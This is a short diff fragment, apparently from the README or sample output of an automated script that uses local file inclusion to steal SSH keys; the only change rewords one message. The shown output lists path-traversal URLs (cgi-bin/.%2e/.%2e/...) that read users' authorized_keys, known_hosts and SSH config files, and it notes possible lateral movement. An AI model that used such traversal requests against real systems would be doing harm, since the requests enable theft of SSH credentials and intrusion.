@@ -32,7 +32,7 @@ LFI to SSH Private Keys - Automated Looting Script
 [!] Found authorized_keys for nick: https://127.0.0.1/cgi-bin/.%2e/.%2e/nick/.ssh/authorized_keys
 [!] Found authorized_keys.bak for nick: https://127.0.0.1/cgi-bin/.%2e/.%2e/nick/.ssh/authorized_keys.bak
 [!] Found known_hosts for miranda: https://127.0.0.1/cgi-bin/.%2e/.%2e/nick/.ssh/known_hosts
-[!] SSH config found for mark (https://127.0.0.1/cgi-bin/.%2e/.%2e/mark/.ssh/config) - lateral movement might be possible
+[!] SSH config found for mark (https://127.0.0.1/cgi-bin/.%2e/.%2e/mark/.ssh/config) - possible lateral movement
     Host: TestServer
        HostName: 192.168.1.10
        User: Thunderdome
